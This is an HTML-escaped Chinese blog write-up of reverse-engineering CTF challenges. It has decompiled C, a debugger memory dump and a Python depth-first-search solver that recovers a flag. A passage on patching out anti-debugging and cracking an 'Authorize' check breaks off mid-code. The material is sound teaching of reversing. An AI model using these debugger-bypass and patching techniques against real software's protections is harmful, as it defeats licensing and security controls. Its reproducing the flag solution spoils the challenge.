    dword_403370 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码是根据输入进行的一系列操作&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( input &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v13 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;l&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v14 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v15 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v16 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v17 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt; )
  {
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;illegal input~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v4 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; (_UNKNOWN &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v7 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_4034F4 )
  {
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;This is not flag~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations!!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
  }
  sub_401020(v8, v11);
  system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pause&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码就是最后的验证环节&lt;/p&gt;
&lt;p&gt;一开始尝试直接看代码，发现自己被绕进去了，完全不知道各个地址是什么东西，所以考虑通过动态调试来得到初始化后的结果&lt;/p&gt;
&lt;h3 id=&#34;动态调试&#34;&gt;动态调试&lt;/h3&gt;
&lt;p&gt;直接拖到 x32dbg 中，在第一个输出的字符串前面打上断点，然后运行到断点的位置&lt;/p&gt;
&lt;p&gt;分析了一下初始化部分，认为关键的内存部分应该是从 &lt;code&gt;403370&lt;/code&gt; 开始一直到 &lt;code&gt;403540&lt;/code&gt; 这部分&lt;/p&gt;
&lt;p&gt;于是找到 &lt;code&gt;3370&lt;/code&gt; ，右键选择内存窗口找到地址&lt;/p&gt;
&lt;p&gt;鉴于数据量不大，直接手dump下来就行了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;00C43370  00 00 00 00 30 00 00 00 80 33 C4 00 00 00 00 00  ....0....3Ä.....  
00C43380  34 00 00 00 98 33 C4 00 8C 33 C4 00 02 00 00 00  4....3Ä..3Ä.....  
00C43390  98 33 C4 00 E0 33 C4 00 2C 00 00 00 8C 33 C4 00  .3Ä.à3Ä.,....3Ä.  
00C433A0  D4 33 C4 00 2A 00 00 00 58 34 C4 00 94 34 C4 00  Ô3Ä.*...X4Ä..4Ä.  
00C433B0  06 00 00 00 D4 33 C4 00 EC 33 C4 00 2A 00 00 00  ....Ô3Ä.ì3Ä.*...  
00C433C0  98 33 C4 00 64 34 C4 00 2F 00 00 00 B8 34 C4 00  .3Ä.d4Ä./...¸4Ä.  
00C433D0  F4 34 C4 00 2A 00 00 00 1C 34 C4 00 94 34 C4 00  ô4Ä.*....4Ä..4Ä.  
00C433E0  33 00 00 00 B0 33 C4 00 EC 33 C4 00 03 00 00 00  3...°3Ä.ì3Ä.....  
00C433F0  F8 33 C4 00 1C 34 C4 00 02 00 00 00 B0 33 C4 00  ø3Ä..4Ä.....°3Ä.  
00C43400  10 34 C4 00 32 00 00 00 7C 34 C4 00 DC 34 C4 00  .4Ä.2...|4Ä.Ü4Ä.  
00C43410  32 00 00 00 28 34 C4 00 F8 33 C4 00 32 00 00 00  2...(4Ä.ø3Ä.2...  
00C43420  8C 33 C4 00 A0 34 C4 00 30 00 00 00 80 33 C4 00  .3Ä. 4Ä.0....3Ä.  
00C43430  EC 33 C4 00 03 00 00 00 28 34 C4 00 A0 34 C4 00  ì3Ä.....(4Ä. 4Ä.  
00C43440  01 00 00 00 BC 33 C4 00 AC 34 C4 00 32 00 00 00  ....¼3Ä.¬4Ä.2...  
00C43450  D4 33 C4 00 EC 33 C4 00 2B 00 00 00 D0 34 C4 00  Ô3Ä.ì3Ä.+...Ð4Ä.  
00C43460  B8 34 C4 00 02 00 00 00 10 34 C4 00 A4 33 C4 00  ¸4Ä......4Ä.¤3Ä.  
00C43470  2E 00 00 00 D0 34 C4 00 88 34 C4 00 01 00 00 00  ....Ð4Ä..4Ä.....  
00C43480  34 34 C4 00 C8 33 C4 00 02 00 00 00 34 34 C4 00  44Ä.È3Ä.....44Ä.  
00C43490  4C 34 C4 00 2D 00 00 00 98 33 C4 00 1C 34 C4 00  L4Ä.-....3Ä..4Ä.  
00C434A0  32 00 00 00 40 34 C4 00 D4 33 C4 00 04 00 00 00  2...@4Ä.Ô3Ä.....  
00C434B0  94 34 C4 00 34 34 C4 00 2D 00 00 00 E8 34 C4 00  .4Ä.44Ä.-...è4Ä.  
00C434C0  70 34 C4 00 30 00 00 00 94 34 C4 00 8C 33 C4 00  p4Ä.0....4Ä..3Ä.  
00C434D0  31 00 00 00 64 34 C4 00 40 34 C4 00 2F 00 00 00  1...d4Ä.@4Ä./...  
00C434E0  EC 33 C4 00 B0 33 C4 00 33 00 00 00 88 34 C4 00  ì3Ä.°3Ä.3....4Ä.  
00C434F0  04 34 C4 00 05 00 00 00 F4 34 C4 00 F4 34 C4 00  .4Ä.....ô4Ä.ô4Ä.  
00C43500  02 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00  ................  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后对照着第二部分的代码一点一点看，发现其实就是如果 &lt;code&gt;*(_DWORD *)v7 + v5 == v11&lt;/code&gt; 就让 &lt;code&gt;v7&lt;/code&gt; 跳到下一个内存地址所指向的地址（这题指针有点绕），比如一开始如果满足输入为 &lt;code&gt;0x34+0x30&lt;/code&gt; 接下来就先走到 &lt;code&gt;C43384&lt;/code&gt; ，然后从这里跳到 &lt;code&gt;C43398&lt;/code&gt; 这个地址，继续下一步运算，如果 &lt;code&gt;v5 - *(_DWORD *)v7 != v11&lt;/code&gt; 就走到下两个内存地址所指向的地址。&lt;/p&gt;
&lt;h3 id=&#34;脚本求解&#34;&gt;脚本求解&lt;/h3&gt;
&lt;p&gt;原理就是根据地址跳一次，那么接下来就是求解了，由于每一步都有两种可能（实际上并不是，要在可见字符有范围的）&lt;/p&gt;
&lt;p&gt;一开始觉得可能只有一种路径，直接用循环求解了，结果不行，就写了个dfs&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000034&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000002&lt;/span&gt;,
           &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433E0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002C&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433D4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43458&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43494&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000006&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433D4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433EC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002A&lt;/span&gt;,
           &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43464&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434B8&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434F4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4341C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43494&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000033&lt;/span&gt;,       &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433EC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000003&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433F8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4341C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000002&lt;/span&gt;,       &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43410&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000032&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4347C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434DC&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000032&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43428&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433F8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000032&lt;/span&gt;,
           &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434A0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000030&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433EC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000003&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43428&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434A0&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000001&lt;/span&gt;,       &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434AC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000032&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433D4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433EC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434D0&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434B8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000002&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43410&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434D0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43488&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000001&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43434&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433C8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000002&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43434&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4344C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002D&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4341C&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000032&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43440&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433D4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000004&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43494&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43434&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434E8&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43470&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000030&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43494&lt;/span&gt;,        &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000031&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43464&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43440&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00002F&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC433EC&lt;/span&gt;,       &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000033&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43488&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC43404&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000005&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434F4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC434F4&lt;/span&gt;,
]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(addr)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; addr[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc43380&lt;/span&gt;:
        addr[i] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc43380&lt;/span&gt;
        addr[i] &lt;span style=&#34;color:#f92672&#34;&gt;//=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;



&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dfs&lt;/span&gt;(start, add, count):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (add &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; add &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; (start &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;):
        print (chr(add), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; start &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dfs(addr[start &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], add &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; addr[start], count &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
        print (chr(add), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dfs(addr[start &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], add &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; addr[start], count &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
        print (chr(add), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

dfs(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 72ab0c6a79cb0b8d0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是倒序输出，且有个 &lt;code&gt;0&lt;/code&gt; 是最初的 &lt;code&gt;0x30&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后反转过来就行了&lt;/p&gt;
&lt;p&gt;（因为 adworld 不会提交，也不知道对不对，反正运行结果是 &lt;code&gt;Congratulations!!&lt;/code&gt; 了）&lt;/p&gt;
&lt;h2 id=&#34;天津垓&#34;&gt;天津垓&lt;/h2&gt;
&lt;h3 id=&#34;反反调试&#34;&gt;反反调试&lt;/h3&gt;
&lt;p&gt;搜索 ida 字符串可以找到反调试的地方，keypatch 修改跳转或者修改函数返回值即可&lt;/p&gt;
&lt;h3 id=&#34;破解-authorize&#34;&gt;破解 Authorize&lt;/h3&gt;
&lt;p&gt;运行 exe 文件，看到 &lt;code&gt;Authorize:&lt;/code&gt; 字符串，到 ida 中通过 &lt;code&gt;Shift+F12&lt;/code&gt; 找到字符串的位置，通过交叉引用找到关键函数。&lt;/p&gt;
&lt;p&gt;查看函数伪代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_1004011F6&lt;/span&gt;()
{
  v39 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;H_gnisiR&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;eppo&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;r&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;eht nehW&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;oh evif &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;sorc snr&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;g eht ,s&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;os nedlo&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;HT reidl&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;si RESUO&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;n.nrob &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t pmuj A&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;ks eht o&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; snrut y&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;dir a ot&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
